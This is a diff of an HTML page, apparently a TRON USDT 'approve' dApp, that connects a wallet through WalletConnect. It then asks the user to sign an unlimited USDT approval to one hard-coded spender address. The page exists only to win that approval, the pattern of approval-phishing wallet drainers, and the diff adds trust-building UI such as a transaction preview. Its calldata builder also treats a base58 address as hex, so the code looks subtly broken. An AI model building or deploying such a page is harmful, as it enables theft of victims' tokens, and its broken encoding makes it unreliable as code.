@@ -3,20 +3,44 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>TRON WalletConnect Approve</title>
+<title>TRON dApp - USDT Approve</title>
 
 <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+
+<style>
+body { font-family: system-ui; margin:20px; }
+button { padding:10px 14px; margin-right:10px; }
+.card { border:1px solid #ddd; padding:12px; margin-top:12px; border-radius:8px; }
+#status { font-weight:bold; margin:10px 0; }
+code { word-break:break-all; }
+</style>
 </head>
 
 <body>
 
-<h2>TRON dApp - USDT Approve</h2>
+<h2>TRON USDT Approve dApp</h2>
 
-<button id="connectBtn">Connect (QR)</button>
+<div id="status">Idle</div>
+
+<button id="connectBtn">Connect Wallet</button>
 <button id="approveBtn" disabled>Approve USDT</button>
 
-<div id="status"></div>
 <div id="qr"></div>
+
+<div class="card" id="ui" style="display:none;">
+  <h3>Transaction Preview</h3>
+
+  <p><b>Token:</b> USDT (TRC20)</p>
+
+  <p><b>Contract:</b><br>
+  <code>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code></p>
+
+  <p><b>Spender:</b><br>
+  <code id="spender"></code></p>
+
+  <p><b>Amount:</b><br>
+  <code>MAX (Unlimited Approval)</code></p>
+</div>
 
 <script type="module">
 
@@ -26,13 +50,9 @@ import SignClient from "https://unpkg.com/@walletconnect/sign-client@2.11.0/dist
 
 const PROJECT_ID = "dde98880530be70b65d01a1be59e5fa3";
 
-/* USDT TRC20 */
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-
-/* SPENDER (adresa ta / contractul tău) */
 const SPENDER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
 
-/* MAX approval */
 const MAX_UINT256 =
 "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
@@ -41,39 +61,39 @@ const MAX_UINT256 =
 let client;
 let session;
 
-/* ================= UI ================= */
-
 const status = (t)=>document.getElementById("status").innerText = t;
 
 /* ================= INIT ================= */
 
 async function init(){
+
   client = await SignClient.init({
     projectId: PROJECT_ID,
     metadata: {
       name: "TRON USDT dApp",
-      description: "Approve flow",
       url: "https://example.com"
     }
   });
+
+  document.getElementById("spender").innerText = SPENDER;
 }
 
 /* ================= QR ================= */
 
-function renderQR(uri){
+function showQR(uri){
   const canvas = document.createElement("canvas");
-
   QRCode.toCanvas(canvas, uri, { width: 260 });
 
-  document.getElementById("qr").innerHTML = "";
-  document.getElementById("qr").appendChild(canvas);
+  const qr = document.getElementById("qr");
+  qr.innerHTML = "";
+  qr.appendChild(canvas);
 }
 
 /* ================= CONNECT ================= */
 
 async function connect(){
 
-  status("Connecting...");
+  status("Connecting wallet...");
 
   const { uri, approval } = await client.connect({
     requiredNamespaces: {
@@ -86,10 +106,10 @@ async function connect(){
   });
 
   if (uri) {
-    renderQR(uri);
+    showQR(uri);
     status("Scan QR in Trust Wallet");
   } else {
-    status("No QR (wallet injected mode)");
+    status("No QR (wallet direct connect)");
   }
 
   session = await approval();
@@ -97,6 +117,8 @@ async function connect(){
   status("Connected");
 
   document.getElementById("approveBtn").disabled = false;
+  document.getElementById("ui").style.display = "block";
+
   document.getElementById("qr").innerHTML = "";
 }
 
@@ -104,12 +126,12 @@ async function connect(){
 
 function buildApproveData(){
 
-  const methodId = "095ea7b3"; // approve(address,uint256)
+  const methodId = "095ea7b3";
 
-  const spenderHex = SPENDER.replace("0x","").padStart(64,"0");
-  const amountHex = BigInt(MAX_UINT256).toString(16).padStart(64,"0");
+  const spender = SPENDER.replace("0x","").padStart(64,"0");
+  const amount = BigInt(MAX_UINT256).toString(16).padStart(64,"0");
 
-  return "0x" + methodId + spenderHex + amountHex;
+  return "0x" + methodId + spender + amount;
 }
 
 /* ================= SEND APPROVE ================= */
@@ -138,14 +160,13 @@ async function approve(){
       }
     });
 
-    status("Approve sent (signed in wallet)");
-
+    status("Approve signed in wallet");
   } catch (e) {
-    status("Rejected or error");
+    status("Rejected");
   }
 }
 
-/* ================= EVENTS ================= */
+/* ================= UI ================= */
 
 document.getElementById("connectBtn").onclick = connect;
 document.getElementById("approveBtn").onclick = approve;
